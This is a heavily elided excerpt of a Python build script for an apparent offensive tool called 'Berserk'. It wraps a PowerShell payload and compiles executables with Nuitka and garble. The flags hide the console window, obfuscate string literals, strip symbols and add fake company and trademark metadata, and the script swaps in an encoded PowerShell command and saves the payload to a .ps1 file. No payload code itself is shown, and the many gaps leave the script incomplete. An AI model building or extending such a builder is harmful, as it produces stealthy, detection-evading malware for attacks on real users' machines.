...
def create_linux(py_file):
    try:
        ...
        icon_file = os.path.join(icons_directory, 'Berserk.ico')  # Default icon file path
        ...
        nuitka_command = [
            ...
            "--onefile",
            "--company-name=Berserk",
            "--file-version=1.2",
            "--copyright=COPYRIGHT@Berserk",
            "--trademarks=No Enemies",
            f"--windows-icon-from-ico=icons/Berserk.ico",
            "--disable-console",
            "--standalone",
            "--remove-output",
            f"--output-dir=Output",
            f"--output-filename=Berserk",
...
def main():
    ...
    print(introduction)
    ans_directory = 'banners'
    parser = argparse.ArgumentParser(description="Berserk=Demon")
    ...
    parser.add_argument("-Ps", "--save_ps_command", action="store_true", help="Save the PowerShell payload to a Berserk.ps1 file in the Output folder")
    ...
    # Use regular expression to find and replace the encodedPSCmd line
        ...
        if platform.system().lower() != "windows":
            if args.platform=="Windows":
                ...
                time.sleep(1)
                subprocess.run("garble -literals -tiny build  -ldflags '-s -w -H=windowsgui' -o ./Output/Berserk.exe pewpew.go", shell=True)
                print("Finished creating the executable in Output folder.")
            if args.platform=="Linux":

                subprocess.run("export GOOS=linux ", shell=True)
                time.sleep(1)
                subprocess.run("garble -literals -tiny build -ldflags '-s -w -H=windowsgui' -o  ./Output/Berserk pewpew.go", shell=True)
                print("Finished creating the executable in Output folder.")
        
        else:
            if args.platform=="Windows":
                subprocess.run("""garble  -literals -tiny build -buildmode=pie -ldflags "-s -w -H=windowsgui" -o ./Output/Berserk.exe pewpew.go """)
                print("Finished creating the executable in Output folder.")
            
        return
    if args.save_ps_command:
        ps_file_path = os.path.join("Output", "Berserk.ps1")
